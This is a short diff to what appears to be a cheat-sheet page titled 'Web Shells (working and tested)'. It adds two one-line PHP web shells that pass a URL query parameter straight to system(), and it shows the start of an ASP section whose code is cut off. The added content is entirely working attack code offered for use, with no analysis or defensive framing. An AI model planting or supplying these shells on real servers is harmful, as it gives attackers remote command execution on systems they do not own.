@@ -1,5 +1,9 @@
 # Web Shells (working and tested)
 ## PHP
+<pre>
+&lt;?php system($_GET['cmd']); ?&gt;
+&lt;?php system($_GET[1]); ?&gt;
+</pre>
 ## ASP
 <pre>
 &lt;%
